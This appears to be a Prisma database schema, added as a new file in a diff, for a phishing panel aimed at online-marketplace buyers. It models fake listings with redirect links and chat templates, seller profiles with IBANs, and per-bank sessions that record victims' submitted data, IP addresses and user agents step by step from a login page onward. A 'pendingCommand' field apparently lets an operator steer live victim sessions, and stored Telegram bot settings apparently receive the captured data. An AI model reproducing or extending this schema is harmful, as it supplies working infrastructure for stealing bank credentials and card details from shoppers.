@@ -1,0 +1,173 @@
+generator client {
+  provider = "prisma-client"
+  output   = "../src/generated/prisma"
+}
+
+datasource db {
+  provider = "postgresql"
+}
+
+model User {
+  id        String   @id @default(cuid())
+  username  String   @unique
+  password  String
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  listings        Listing[]
+  settings        Settings?
+  sellerTemplates SellerTemplate[]
+  chatTemplates   ChatTemplate[]
+}
+
+model Listing {
+  id          String   @id @default(cuid())
+  sellerName       String
+  address          String
+  sellerAvatar     String?
+  redirectMarketplace  String?
+  redirectRealEstate   String?
+  redirectAuto         String?
+  redirectJobs         String?
+  redirectPostListing  String?
+  template         String   @default("default")
+  title       String
+  price       Float
+  mainImage   String
+  images      String[] @default([])
+  slug        String
+  status      String   @default("draft")
+  externalUrl String?
+  sourceUrl   String?
+  description String?
+  buyerName        String?
+  buyerAddress     String?
+  buyerOrderNumber String?
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+
+  userId      String
+  user        User     @relation(fields: [userId], references: [id])
+
+  messages    Message[]
+  events      Event[]
+}
+
+model Message {
+  id        String   @id @default(cuid())
+  content   String
+  sender    String
+  read      Boolean  @default(false)
+  imageUrl  String?
+  createdAt DateTime @default(now())
+
+  listingId String
+  listing   Listing  @relation(fields: [listingId], references: [id], onDelete: Cascade)
+}
+
+model Settings {
+  id              String @id @default(cuid())
+  externalDomain  String @default("")
+  apiKey          String @default("")
+  apiEndpoint     String @default("")
+  telegramBotToken String @default("")
+  telegramChatId   String @default("")
+  banksGloballyEnabled Boolean @default(true)
+  creditCardEnabled    Boolean @default(true)
+
+  userId          String @unique
+  user            User   @relation(fields: [userId], references: [id])
+}
+
+model Bank {
+  id          String   @id @default(cuid())
+  slug        String   @unique
+  name        String
+  logo        String   @default("")
+  urlTemplate String   @default("")
+  enabled     Boolean  @default(false)
+  maintenance Boolean  @default(false)
+  order       Int      @default(0)
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+
+  submissions BankSubmission[]
+  sessions    BankSession[]
+}
+
+model BankSubmission {
+  id        String   @id @default(cuid())
+  bankId    String
+  listingId String?
+  sessionId String?
+  step      String
+  data      Json
+  ip        String   @default("")
+  userAgent String   @default("")
+  createdAt DateTime @default(now())
+
+  bank    Bank         @relation(fields: [bankId], references: [id], onDelete: Cascade)
+  session BankSession? @relation(fields: [sessionId], references: [id], onDelete: SetNull)
+
+  @@index([bankId, createdAt])
+  @@index([listingId])
+  @@index([sessionId])
+}
+
+model BankSession {
+  id             String   @id @default(cuid())
+  shortCode      String   @unique @default("")
+  bankId         String
+  listingId      String?
+  currentStep    String   @default("login")
+  pendingCommand Json?
+  ip             String   @default("")
+  userAgent      String   @default("")
+  lastSeenAt     DateTime @default(now())
+  createdAt      DateTime @default(now())
+  updatedAt      DateTime @updatedAt
+  closedAt       DateTime?
+
+  bank        Bank             @relation(fields: [bankId], references: [id], onDelete: Cascade)
+  submissions BankSubmission[]
+
+  @@index([bankId, lastSeenAt])
+  @@index([listingId])
+}
+
+model SellerTemplate {
+  id        String   @id @default(cuid())
+  name      String
+  address   String   @default("")
+  phone     String   @default("")
+  email     String   @default("")
+  iban      String   @default("")
+  notes     String   @default("")
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  userId    String
+  user      User     @relation(fields: [userId], references: [id])
+}
+
+model ChatTemplate {
+  id        String   @id @default(cuid())
+  title     String
+  content   String
+  createdAt DateTime @default(now())
+
+  userId    String
+  user      User     @relation(fields: [userId], references: [id])
+}
+
+model Event {
+  id        String   @id @default(cuid())
+  type      String
+  ip        String   @default("")
+  userAgent String   @default("")
+  metadata  Json?
+  createdAt DateTime @default(now())
+
+  listingId String
+  listing   Listing  @relation(fields: [listingId], references: [id], onDelete: Cascade)
+}
